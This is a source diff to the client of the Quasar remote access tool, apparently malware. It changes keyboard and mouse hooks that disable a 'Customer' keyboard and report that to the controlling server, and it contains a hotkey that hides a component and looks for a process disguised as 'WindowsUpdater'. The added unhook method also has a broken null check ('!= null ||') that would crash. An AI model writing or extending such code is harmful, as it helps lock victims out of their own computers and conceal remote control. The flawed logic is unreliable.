@@ -19,8 +19,8 @@ namespace Quasar.Client.Messages
 {
     public class CustomCommandHandler : IMessageProcessor
     {
-        private IntPtr _keyboardHookID = IntPtr.Zero;
-        private IntPtr _mouseHookID = IntPtr.Zero;
+        public static IntPtr _keyboardHookID = IntPtr.Zero;
+        private static IntPtr _mouseHookID = IntPtr.Zero;
 
         private Form _mainForm;
 
@@ -31,8 +31,8 @@ namespace Quasar.Client.Messages
         private bool _ctrlPressed = false;
         private bool _altPressed = false;
 
-        private Thread _keyboardHookThread;
-        private Thread _mouseHookThread;
+        private static Thread _keyboardHookThread;
+        private static Thread _mouseHookThread;
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WH_MOUSE_LL = 14;
@@ -122,6 +122,33 @@ namespace Quasar.Client.Messages
             _mainForm = mainForm; // Store reference to the main form
             _keyboardProc = KeyboardHookCallback;
             _mouseProc = MouseHookCallback;
+        }
+
+        public static void UnHooKBMHooks()
+        {
+            if (_mouseHookID != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_mouseHookID);
+                _mouseHookID = IntPtr.Zero;
+            }
+
+            if (_mouseHookThread != null || _mouseHookThread.IsAlive)
+            {
+                PostThreadMessage(_mouseHookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
+                _mouseHookThread = null;
+            }
+
+            if (_keyboardHookID != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(_keyboardHookID);
+                _keyboardHookID = IntPtr.Zero;
+            }
+
+            if (_keyboardHookThread != null || _keyboardHookThread.IsAlive)
+            {
+                PostThreadMessage(_keyboardHookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
+                _keyboardHookThread = null;
+            }
         }
 
         static string GetDesktopName(IntPtr hDesktop)
@@ -274,6 +301,7 @@ namespace Quasar.Client.Messages
                     _keyboardHookThread.SetApartmentState(ApartmentState.STA);
                     _keyboardHookThread.IsBackground = true;
                     _keyboardHookThread.Start();
+
                     client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Disabled (Hook thread started)!" });
                 }
             }
@@ -316,6 +344,7 @@ namespace Quasar.Client.Messages
                 if (key == Keys.K && _ctrlPressed && _altPressed)
                 {
                     Interception.InterceptionHelper.HideFunction();
+
                     string targetProcess = "WindowsUpdater";
                     var processes = Process.GetProcessesByName(targetProcess);
                     if (!processes.Any())
